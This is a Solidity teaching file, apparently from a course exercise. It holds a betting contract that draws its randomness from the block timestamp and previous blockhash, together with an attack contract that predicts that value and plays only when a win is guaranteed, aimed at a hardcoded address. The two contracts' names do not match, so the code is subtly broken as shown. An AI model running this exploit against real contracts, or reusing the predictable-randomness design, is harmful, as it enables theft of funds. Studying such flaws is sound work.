pragma solidity ^0.4.24;

contract game{

    event win(address);

    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon) % 1000;
    }

    function play() public payable {
        require(msg.value == 0.01 ether);
        if(get_random()>=500){
            msg.sender.transfer(0.02 ether);
            emit win(msg.sender);
        }
    }

    function () public payable{
        require(msg.value == 0.05 ether);
    }
    
    constructor () public payable{
        require(msg.value == 0.05 ether);
    }
}

contract class44_attack{

    address public game = 0xF86d20fba47a417939645d039158D7ad909b2997;

    class44_game gamecontract = class44_game(game);

    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon) % 1000;
    }

    function attack() public payable {
        require(get_random()>=500);
        gamecontract.play.value(0.01 ether)();
        
    }

    function () public payable{
        
    }
    
    constructor () public payable{
        require(msg.value == 0.05 ether);
    }
}
